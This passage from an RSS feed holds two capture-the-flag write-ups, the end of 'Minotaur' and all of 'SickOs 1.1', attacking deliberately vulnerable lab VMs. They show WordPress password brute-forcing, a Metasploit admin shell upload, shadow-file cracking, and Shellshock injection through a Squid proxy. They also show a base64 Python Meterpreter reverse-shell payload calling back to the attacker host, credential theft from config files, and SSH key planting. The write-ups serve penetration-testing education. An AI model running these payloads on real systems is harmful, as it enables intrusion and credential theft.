00477:  C=200    321 L	     862 W	  16057 Ch	  &amp;quot;bull&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, we find a &amp;lsquo;Bull Blog&amp;rsquo;, powered by Wordpress.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/minotaur/bulls.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;h2 id=&#34;wordpress:130852a9ee39e601e939903b24e77be6&#34;&gt;Wordpress&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;wpscan&lt;/code&gt; is my defacto tool for scanning Wordpress.  &lt;code&gt;root@kali:~# wpscan -u http://192.168.56.223/bull/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This spits out 12 potential vulnerabilities, most of them being XSS.  The most promising looking one is a &lt;code&gt;Slideshow Gallery &amp;lt; 1.4.7 Arbitrary File Upload&lt;/code&gt;.  However, we do need some valid credentials to do this. &lt;code&gt;wpscan&lt;/code&gt; can enumerate users for us, which is half the battle.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;    +----+-------+-------+
    | Id | Login | Name  |
    +----+-------+-------+
    | 1  | bully | bully |
    +----+-------+-------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, this is where that second hint comes into play - a password we aren&amp;rsquo;t likely to find in an existing wordlist.  I generated my own password list using &lt;code&gt;CeWL&lt;/code&gt; and &lt;code&gt;john&lt;/code&gt; - a technique I learnt way back in &lt;a href=&#34;writeups/2014/hell-1-part-1/&#34;&gt;Hell&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/minotaur# cewl -m 5 -w bulls http://192.168.56.223/bull/
root@kali:~/minotaur# wc -l bulls 
315 bulls
root@kali:~/minotaur# john --wordlist=bulls --rules --stdout &amp;gt;&amp;gt; bulls 
root@kali:~/minotaur# wc -l bulls 
14590 bulls
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s a lot of bulls :)&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wpscan&lt;/code&gt; can also bruteforce the password for us, which is nice as we don&amp;rsquo;t have to screw around with &lt;code&gt;hydra&lt;/code&gt; or &lt;code&gt;medusa&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/minotaur# wpscan -u http://192.168.56.223/bull/ -w /root/minotaur/bulls --username bully --threads 50

[+] Starting the password brute forcer
  Brute Forcing &#39;bully&#39; Time: 00:03:32 &amp;lt;=======================================================================        &amp;gt; (13331 / 14591) 91.36%  ETA: 00:00:20
  [+] [SUCCESS] Login : bully Password : Bighornedbulls
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I manually logged in just to make sure they worked, and I also noted that this was an admin account (which was fairly predictable due to its ID).  But it does mean that we don&amp;rsquo;t actually need to exploit the Slideshow Gallery vulnerability, as we can just upload a PHP Shell via this admin panel.&lt;/p&gt;

&lt;h2 id=&#34;shell:130852a9ee39e601e939903b24e77be6&#34;&gt;Shell&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;ll just use the &lt;code&gt;exploit/unix/webapp/wp_admin_shell_upload&lt;/code&gt; Metasploit module for this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf exploit(wp_admin_shell_upload) &amp;gt; exploit 

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Authenticating with WordPress using bully:Bighornedbulls...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /bull/wp-content/plugins/JthxXkaTsb/zQvuEhlHdT.php...
[*] Sending stage (33684 bytes) to 192.168.56.223
[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.223:53478) at 2016-04-15 17:08:46 +0100
[+] Deleted zQvuEhlHdT.php
[+] Deleted JthxXkaTsb.php

meterpreter &amp;gt; sysinfo 
Computer    : minotaur
OS          : Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686
Meterpreter : php/php
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag-1:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 1&lt;/h2&gt;

&lt;p&gt;The VM description told us that there are multiple flags, the first of which is found in the webroot.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; cat /var/www/html/flag.txt
Oh, lookey here. A flag!
Th15 15 @N 3@5y f1@G!
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag-2:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 2&lt;/h2&gt;

&lt;p&gt;The second flag is found in the &lt;code&gt;/tmp&lt;/code&gt; directory, along with a priv-esc opportunity.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls /tmp

100640/rw-r-----  121   fil   2015-05-27 03:47:45 +0100  flag.txt
100640/rw-r-----  1148  fil   2015-05-27 07:47:30 +0100  shadow.bak

meterpreter &amp;gt; cat /tmp/flag.txt
That shadow.bak file is probably useful, hey?
Also, you found a flag!
My m1L|&amp;lt;$|-|@|&amp;lt;3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;root:130852a9ee39e601e939903b24e77be6&#34;&gt;root&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; download /tmp/shadow.bak
[*] downloading: /tmp/shadow.bak -&amp;gt; shadow.bak
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I extracted the hashes for &lt;code&gt;root&lt;/code&gt;, &lt;code&gt;minotaur&lt;/code&gt;, &lt;code&gt;heffer&lt;/code&gt; and &lt;code&gt;h0rnbag&lt;/code&gt; and ran them through &lt;code&gt;john&lt;/code&gt;.  I got one hit pretty quickly.  &lt;code&gt;Password1        (heffer)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I was able to use these creds and login over SSH and retrieve his flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/minotaur# ssh heffer@192.168.56.223

heffer@minotaur:~$ ls -l

-rw------- 1 heffer heffer 107 May 27  2015 flag.txt

heffer@minotaur:~$ cat flag.txt 
So this was an easy flag to get, hopefully. Have you gotten ~minotaur/flag.txt yet?
Th3 fl@G 15: m00000 y0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This user has a sudo entry, but it doesn&amp;rsquo;t seem to work.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;heffer@minotaur:~$ sudo -l

User heffer may run the following commands on minotaur:
    (root) NOPASSWD: /root/bullquote.sh

heffer@minotaur:~$ sudo /root/bullquote.sh
[sudo] password for heffer: 
sudo: /root/bullquote.sh: command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the time I was poking around here, I got a second password from &lt;code&gt;john&lt;/code&gt;:  &lt;code&gt;obiwan6          (minotaur)&lt;/code&gt;.  I did a quick &lt;code&gt;su&lt;/code&gt; and collected &lt;code&gt;minotaur&lt;/code&gt;&amp;rsquo;s flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;heffer@minotaur:~$ su minotaur
Password: 
minotaur@minotaur:/home/heffer$ cd
minotaur@minotaur:~$ ls -l
-rw------- 1 minotaur minotaur  107 May 27  2015 flag.txt
drwxr-xr-x 4 minotaur minotaur 4096 May 27  2015 peda

minotaur@minotaur:~$ cat flag.txt 
Congrats! You&#39;ve found the first flag:
M355 W17H T3H 8ULL, G37 73H H0RN!

But can you get /root/flag.txt ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;minotaur&lt;/code&gt; is able to run ALL as &lt;code&gt;root&lt;/code&gt;.  Which makes elevation to &lt;code&gt;root&lt;/code&gt; nice and easy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;minotaur@minotaur:~$ sudo -l

User minotaur may run the following commands on minotaur:
    (root) NOPASSWD: /root/bullquote.sh
    (ALL : ALL) ALL

minotaur@minotaur:~$ sudo -i
[sudo] password for minotaur: 
root@minotaur:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;final-flag:130852a9ee39e601e939903b24e77be6&#34;&gt;Final Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@minotaur:~# ls -l
-rw------- 1 root root   70 May 27  2015 flag.txt
drwxr-xr-x 4 root root 4096 May 27  2015 peda
-rwx------ 1 root root  845 May 15  2015 quotes.txt

root@minotaur:~# cat flag.txt 
Congrats! You got the final flag!
Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>SickOs 1.1</title>
      <link>https://rastamouse.me/writeups/2015/sickos-1-1/</link>
      <pubDate>Sat, 12 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/sickos-1-1/</guid>
      <description>

&lt;p&gt;This VM was made by some chap called &lt;a href=&#34;https://twitter.com/D4rk36&#34;&gt;D4rk&lt;/a&gt;. His description:  This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.&lt;/p&gt;

&lt;p&gt;So without further ado&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;port-scan:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Port Scan&lt;/h2&gt;

&lt;p&gt;As always, smash it with &lt;code&gt;nmap&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.50.105

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy

MAC Address: 08:00:27:17:00:0D (Oracle VirtualBox virtual NIC)
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My first assumption was that I should attempt to connect to port &lt;code&gt;8080&lt;/code&gt;, via the Squid Proxy on &lt;code&gt;3128&lt;/code&gt;.  So I tried to manually connect using the HTTP CONNECT method.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.50.105 3128
CONNECT 127.0.0.1:8080 HTTP/1.0

HTTP/1.0 403 Forbidden
Server: squid/3.1.19
Mime-Version: 1.0
Date: Sat, 12 Dec 2015 13:49:09 GMT
Content-Type: text/html
Content-Length: 3020
X-Squid-Error: ERR_ACCESS_DENIED 0
Vary: Accept-Language
Content-Language: en
X-Cache: MISS from localhost
X-Cache-Lookup: NONE from localhost:3128
Via: 1.0 localhost (squid/3.1.19)
Connection: close
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It seems that maybe there is an ACL in place, which stops us from accessing some ports.  We can connect port 22 via the proxy just fine, but not others.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.50.105 3128
CONNECT 127.0.0.1:22 HTTP/1.0

HTTP/1.0 200 Connection established

SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1

Protocol mismatch.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried using the &lt;code&gt;nmap --proxy&lt;/code&gt; option, but it didn&amp;rsquo;t return any open or closed ports for me.  Whilst I was moaning, &lt;a href=&#34;https://twitter.com/Arr0way&#34;&gt;Arr0way&lt;/a&gt; pointed out that there was an MSF module that I could try instead.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use auxiliary/scanner/http/squid_pivot_scanning

Module options (auxiliary/scanner/http/squid_pivot_scanning):

   Name          Current Setting                                  Required  Description
   ----          ---------------                                  --------  -----------
   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE         127.0.0.1                                        yes       IPs to scan through Squid proxy
   RHOSTS        192.168.50.105                                   yes       The target address range or CIDR identifier
   RPORT         3128                                             yes       The target port
   THREADS       1000                                             yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host

msf auxiliary(squid_pivot_scanning) &amp;gt; run 

[+] [192.168.50.105] 127.0.0.1 is alive but 21 is CLOSED
[+] [192.168.50.105] 127.0.0.1:80 seems OPEN
[+] [192.168.50.105] 127.0.0.1 is alive but 139 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 445 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 1433 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 1521 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 1723 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 3389 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 8080 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 9100 is CLOSED
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This worked a lot better as port 80 looked open.  I used &lt;code&gt;cURL&lt;/code&gt;, along with its proxy option to try and talk to the web service.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -v http://127.0.0.1 -x http://192.168.50.105:3128
* Rebuilt URL to: http://127.0.0.1/
* Hostname was NOT found in DNS cache
*   Trying 192.168.50.105...
* Connected to 192.168.50.105 (192.168.50.105) port 3128 (#0)
&amp;gt; GET http://127.0.0.1/ HTTP/1.1
&amp;gt; User-Agent: curl/7.38.0
&amp;gt; Host: 127.0.0.1
&amp;gt; Accept: */*
&amp;gt; Proxy-Connection: Keep-Alive
&amp;gt; 
* HTTP 1.0, assume close after body
&amp;lt; HTTP/1.0 200 OK
&amp;lt; Date: Sat, 12 Dec 2015 14:04:49 GMT
&amp;lt; Server: Apache/2.2.22 (Ubuntu)
&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
&amp;lt; Vary: Accept-Encoding
&amp;lt; Content-Length: 21
&amp;lt; Content-Type: text/html
&amp;lt; X-Cache: MISS from localhost
&amp;lt; X-Cache-Lookup: MISS from localhost:3128
&amp;lt; Via: 1.0 localhost (squid/3.1.19)
* HTTP/1.0 connection set to keep alive!
&amp;lt; Connection: keep-alive
&amp;lt; 
&amp;lt;h1&amp;gt;
BLEHHH!!!
&amp;lt;/h1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next I decided to try and find any other pages/directories that might reveal a webapp of some sort.  For this I used &lt;code&gt;dirbuster&lt;/code&gt;.  After a few seconds, it spat out an error concerning responses from pages that don&amp;rsquo;t exist.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/sickos-1/dirbuster.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;It&amp;rsquo;s accessing &lt;code&gt;/cgi-bin/status&lt;/code&gt; and no matter what comes after (i.e. &lt;code&gt;/cgi-bin/status/junk&lt;/code&gt;), the content of the script gets returned.  Dirbuster was getting confused because the uptime was obviously changing between requests.&lt;/p&gt;

&lt;p&gt;Regardless, we have a cgi script that&amp;rsquo;s just screaming shellshock.&lt;/p&gt;

&lt;h2 id=&#34;shellshock:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Shellshock&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128
{ &amp;quot;uptime&amp;quot;: &amp;quot; 19:49:53 up 2:41, 1 user, load average: 0.00, 0.01, 0.01&amp;quot;, &amp;quot;kernel&amp;quot;: &amp;quot;Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux&amp;quot;}

root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/id&amp;quot;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s try and get a reverse shell going - you could use something simple like a &lt;code&gt;nc -e /bin/sh&lt;/code&gt; or TCP reverse shell, but I thought I would spice things up with a bit of Meterpreter.  Confirm there is Python installed&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/which python&amp;quot;
/usr/bin/python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then generate a payload.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.50.101 LPORT=4444
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;UTF-8&#39;)}[sys.version_info[0]](&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=&#39;)))
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;shell:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Shell&lt;/h2&gt;

&lt;p&gt;All you have to do to get this working is &lt;code&gt;/usr/bin/python -c&lt;/code&gt; and copy/paste the &lt;code&gt;msfvenom&lt;/code&gt; output, but make sure you escape the double-quote characters.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/python -c \&amp;quot;import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;UTF-8&#39;)}[sys.version_info[0]](&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=&#39;)))&amp;quot;\&amp;quot;

msf exploit(handler) &amp;gt; exploit 

[*] Started reverse handler on 192.168.50.101:4444 
[*] Starting the payload handler...
[*] Sending stage (36849 bytes) to 192.168.50.105
[*] Meterpreter session 1 opened (192.168.50.101:4444 -&amp;gt; 192.168.50.105:40247) at 2015-12-12 14:24:19 +0000

meterpreter &amp;gt; sysinfo 
Computer     : SickOs
OS           : Linux 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014
Architecture : i686
Meterpreter  : python/python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After browsing the filesystem, we find some more things in &lt;code&gt;/var/www/&lt;/code&gt;, including the following file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwxrwxrwx 1 root root  109 Dec  5 07:57 connect.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This set some alarm bells ringing, but I couldn&amp;rsquo;t find anywhere where this was getting executed as root (e.g a cron).  There is also a directory for &lt;code&gt;wolfcms&lt;/code&gt;, so we check that out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls
Listing: /var/www/wolfcms
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  950   fil   2015-12-05 02:13:03 +0000  .htaccess
100777/rwxrwxrwx  4084  fil   2015-12-06 15:47:22 +0000  CONTRIBUTING.md
100777/rwxrwxrwx  2405  fil   2015-12-06 15:47:22 +0000  README.md
100777/rwxrwxrwx  403   fil   2015-12-06 15:47:22 +0000  composer.json
100777/rwxrwxrwx  3058  fil   2015-12-06 15:47:22 +0000  config.php
40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  docs
100777/rwxrwxrwx  894   fil   2015-12-06 15:47:22 +0000  favicon.ico
100777/rwxrwxrwx  6815  fil   2015-12-06 15:47:22 +0000  index.php
40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  public
100777/rwxrwxrwx  0     fil   2015-12-06 15:47:22 +0000  robots.txt
40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  wolf


meterpreter &amp;gt; cat config.php
&amp;lt;?php 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define(&#39;DB_DSN&#39;, &#39;mysql:dbname=wolf;host=localhost;port=3306&#39;);
define(&#39;DB_USER&#39;, &#39;root&#39;);
define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
define(&#39;TABLE_PREFIX&#39;, &#39;&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can drop into a shell, connect to &lt;code&gt;mysql&lt;/code&gt; and see if we can find anything interesting.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ mysql -uroot -p
Enter password: john@123

mysql&amp;gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wolf               |
+--------------------+

mysql&amp;gt; use wolf;

mysql&amp;gt; show tables;
+-----------------+
| Tables_in_wolf  |
+-----------------+
| cron            |
| layout          |
| page            |
| page_part       |
| page_tag        |
| permission      |
| plugin_settings |
| role            |
| role_permission |
| secure_token    |
| setting         |
| snippet         |
| tag             |
| user            |
| user_role       |
+-----------------+

mysql&amp;gt; select * from user;
+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
| id | name          | email              | username | password                                                                                                                         | salt                                                             | language | last_login          | last_failure | failure_count | created_on          | updated_on          | created_by_id | updated_by_id |
+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
|  1 | Administrator | admin@yoursite.com | admin    | 3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f | 6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167 | en       | 2015-12-05 07:47:16 | NULL         |             0 | 2015-12-05 06:25:06 | 2015-12-05 07:47:16 |             1 |          NULL |
+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we can quickly grab the mysql users.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mysql&amp;gt; select * from mysql.user;

| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |

| localhost | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| sickos    | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| 127.0.0.1 | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| ::1       | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| localhost | debian-sys-maint | *CB98094782C386F2459D65D97B17D1DE15D1654B | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We notice that all the users are using the same hash, therefore the same password.  Sickos is also a user on the OS, so maybe they are using the same password?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ su sickos
Password: john@123
bash: no job control in this shell
sickos@SickOs:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome.  Even though SSH is running on the system, Sickos has no keys.  So I used &lt;code&gt;ssh-keygen&lt;/code&gt; to create a new set of keys and the &lt;code&gt;.ssh&lt;/code&gt; directory, then echo&amp;rsquo;d my kali public key into the authorized_keys file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh sickos@192.168.50.105
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

sickos@SickOs:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We see straight away that sickos is a member of the sudo group.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sickos@SickOs:~$ id
uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)

sickos@SickOs:~$ sudo -l
[sudo] password for sickos: 
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which makes elevation trivial.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@SickOs:~# hostname; id
SickOs
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@SickOs:~# cat /root/a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>The Wall: 1</title>
      <link>https://rastamouse.me/writeups/2015/the-wall/</link>
